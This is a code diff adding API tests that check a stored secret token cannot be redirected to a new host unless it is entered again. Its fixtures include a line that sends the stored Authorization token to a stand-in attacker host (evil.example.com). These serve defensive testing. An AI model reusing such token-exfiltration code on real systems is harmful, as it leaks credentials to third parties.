@@ -89,6 +89,33 @@ EXAMPLE_FULL: dict[str, Any] = {
 }
 
 
+SENDER_URL = "https://hooks.example.com/a"
+MOVED_URL = "https://evil.example.com/a"
+SENDER_HOG = "fetch(inputs.url, {'headers': {'Authorization': inputs.token}});"
+MOVED_SENDER_HOG = "fetch('https://evil.example.com', {'headers': {'Authorization': inputs.token}});"
+SECRET_SENDER: dict[str, Any] = {
+    "name": "Secret sender",
+    "type": "destination",
+    "hog": SENDER_HOG,
+    "inputs_schema": [
+        {"key": "url", "type": "string", "label": "URL", "required": True},
+        {"key": "token", "type": "string", "label": "Token", "secret": True, "required": True},
+    ],
+    "inputs": {"url": {"value": SENDER_URL}, "token": {"value": "I AM SECRET"}},
+}
+
+
+def _sender_inputs(url: str, token: Optional[dict] = None) -> dict:
+    return {"url": {"value": url}, "token": token or {"secret": True}}
+
+
+def secret_host_binding_flag(enabled: bool):
+    return patch(
+        "products.cdp.backend.api.hog_function.posthoganalytics.feature_enabled",
+        side_effect=lambda flag, *args, **kwargs: enabled and flag == "cdp-secret-host-binding",
+    )
+
+
 def get_db_field_value(field, model_id):
     cursor = connection.cursor()
     cursor.execute(f"select {field} from posthog_hogfunction where id='{model_id}';")
@@ -1218,8 +1245,9 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
                     "bytecode_contract": RUNTIME_CONTRACT,
                     "value": "I AM SECRET",
                     "order": 0,
+                    "allowed_hosts": "*",
                 },
-                "gAAAAABlkgC8AAAAAAAAAAAAAAAAAAAAAKvzDjuLG689YjjVhmmbXAtZSRoucXuT8VtokVrCotIx3ttPcVufoVt76dyr2phbuotMldKMVv_Y6uzMDZFjX1VQVJqL13wH-WALMn9obfpLYD_WWOUdMA6VurFg1TxdopDxFtIztV_BWe5ApI2TtI57CYnHc8Meh0Qo-Ii9TRkDbxtU0E48PqNx6eqhGROrzCtN2rORP2bj-BM983QSq6ufd6CpPUqUUvSHhvhP0klo",
+                "gAAAAABlkgC8AAAAAAAAAAAAAAAAAAAAAKvzDjuLG689YjjVhmmbXAtZSRoucXuT8VtokVrCotIx3ttPcVufoVt76dyr2phbuotMldKMVv_Y6uzMDZFjX1VQVJqL13wH-WALMn9obfpLYD_WWOUdMA6VurFg1TxdopDxFtIztV_BWe5ApI2TtI5TGtE3dw7Y8AT_Gs7SFzpwuQM3rhYDmuNnIMwpZRsSnWkcHUxDsKXKZpnGcn2Kuw4478ORMch-0hpkZQ1A2lJBhuJw1MYovyQkGmiITTdFXA==",
                 {"secret": True},
                 [],
             ),
@@ -1234,7 +1262,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
                     "templating": False,
                 },
                 {"Authorization": "Bearer I AM SECRET"},
-                {"value": {"Authorization": "Bearer I AM SECRET"}, "order": 0},
+                {"value": {"Authorization": "Bearer I AM SECRET"}, "order": 0, "allowed_hosts": []},
                 None,
                 {"secret": True, "value": {"Authorization": "********"}},
                 [{"key": "headers", "type": "dictionary", "label": "Headers", "required": False}],
@@ -1250,7 +1278,7 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
                     "templating": False,
                 },
                 {"I AM SECRET": "account-1"},
-                {"value": {"I AM SECRET": "account-1"}, "order": 0},
+                {"value": {"I AM SECRET": "account-1"}, "order": 0, "allowed_hosts": []},
                 None,
                 {"secret": True},
                 [],
@@ -1402,6 +1430,139 @@ class TestHogFunctionAPI(ClickhouseTestMixin, APIBaseTest, QueryMatchingTest):
         obj = HogFunction.objects.get(id=function_id)
         assert (obj.inputs or {})["token"]["value"] == "I AM PUBLIC NOW"
         assert (obj.encrypted_inputs or {}) == {}
+
+    @parameterized.expand(
+        [
+            ("rename", "patch", {"name": "Renamed"}, True, status.HTTP_200_OK, ["hooks.example.com"]),
+            ("disable", "patch", {"enabled": False}, True, status.HTTP_200_OK, ["hooks.example.com"]),
+            (
+                "filter_edit",
+                "patch",
+                {"filters": {"source": "events"}},
+                True,
+                status.HTTP_200_OK,
+                ["hooks.example.com"],
+            ),
+            (
+                "unchanged_resave",
+                "put",
+                {"inputs": _sender_inputs(SENDER_URL)},
+                True,
+                status.HTTP_200_OK,
+                ["hooks.example.com"],
+            ),
+            (
+                "same_host",
+                "patch",
+                {"inputs": _sender_inputs("https://hooks.example.com/b")},
+                True,
+                status.HTTP_200_OK,
+                ["hooks.example.com"],
+            ),
+            (
+                "new_host",
+                "patch",
+                {"inputs": _sender_inputs(MOVED_URL)},
+                True,
+                status.HTTP_400_BAD_REQUEST,
+                ["hooks.example.com"],
+            ),
+            (
+                "new_host_by_put",
+                "put",
+                {"inputs": _sender_inputs(MOVED_URL)},
+                True,
+                status.HTTP_400_BAD_REQUEST,
+                ["hooks.example.com"],
+            ),
+            (
+                "new_host_with_the_flag_off",
+                "patch",
+                {"inputs": _sender_inputs(MOVED_URL)},
+                False,
+                status.HTTP_200_OK,
+                ["hooks.example.com"],
+            ),
+            (
+                "new_host_with_the_secret_entered",
+                "patch",
+                {"inputs": _sender_inputs(MOVED_URL, {"value": "I AM NEW"})},
+                True,
+                status.HTTP_200_OK,
+                ["evil.example.com"],
+            ),
+            (
+                "code_sends_it_elsewhere",
+                "patch",
+                {"hog": MOVED_SENDER_HOG},
+                True,
+                status.HTTP_400_BAD_REQUEST,
+                ["hooks.example.com"],
+            ),
+            (
+                "code_cannot_be_analyzed",
+                "patch",
+                {"hog": "fetch(event.properties.url, {'body': inputs.token});"},
+                True,
+                status.HTTP_400_BAD_REQUEST,
+                ["hooks.example.com"],
+            ),
+        ]
+    )
+    def test_moving_a_stored_secret_needs_it_entered_again(
+        self, _name: str, method: str, change: dict, flag_on: bool, expected_status: int, expected_hosts: list[str]
+    ) -> None:
+        res = self.client.post(f"/api/projects/{self.team.id}/hog_functions/", data=SECRET_SENDER)
+        assert res.status_code == status.HTTP_201_CREATED, res.json()
+        function_id = res.json()["id"]
+
+        with secret_host_binding_flag(flag_on):
+            res = getattr(self.client, method)(
+                f"/api/projects/{self.team.id}/hog_functions/{function_id}",
+                data={**SECRET_SENDER, **change} if method == "put" else change,
+            )
+
+        assert res.status_code == expected_status, res.json()
+        if expected_status == status.HTTP_400_BAD_REQUEST:
+            assert (res.json()["attr"], res.json()["code"]) == ("inputs__token", "secret_reentry_required")
+        stored = HogFunction.objects.get(id=function_id).encrypted_inputs["token"]
+        assert stored["value"] == change.get("inputs", {}).get("token", {}).get("value", "I AM SECRET")
+        assert stored["allowed_hosts"] == expected_hosts
+
+    @parameterized.expand(
+        [
+            ("known_hosts_new_host", SENDER_HOG, {"inputs": _sender_inputs(MOVED_URL)}, status.HTTP_400_BAD_REQUEST),
+            (
+                "unknown_hosts_rename",
+                "fetch(event.properties.url, {'body': inputs.token});",
+                {"name": "Renamed"},
+                status.HTTP_200_OK,
+            ),
+            (
+                "unknown_hosts_any_config_change",
+                "fetch(event.properties.url, {'body': inputs.token});",
+                {"inputs": _sender_inputs("https://hooks.example.com/b")},
+                status.HTTP_400_BAD_REQUEST,
+            ),
+        ]
+    )
+    def test_secret_saved_before_hosts_were_bound_is_checked_against_its_stored_config(
+        self, _name: str, hog: str, change: dict, expected_status: int
+    ) -> None:
+        function = HogFunction.objects.create(
+            team=self.team,
+            name="Saved before binding",
+            type="destination",
+            hog=hog,
+            inputs_schema=SECRET_SENDER["inputs_schema"],
+            inputs={"url": {"value": SENDER_URL}},
+            encrypted_inputs={"token": {"value": "I AM SECRET"}},
+        )
+
+        with secret_host_binding_flag(True):
+            res = self.client.patch(f"/api/projects/{self.team.id}/hog_functions/{function.id}", data=change)
+
+        assert res.status_code == expected_status, res.json()
 
     @parameterized.expand(
         [("disable", {"enabled": False}), ("delete", {"deleted": True}), ("rename", {"name": "Renamed"})]
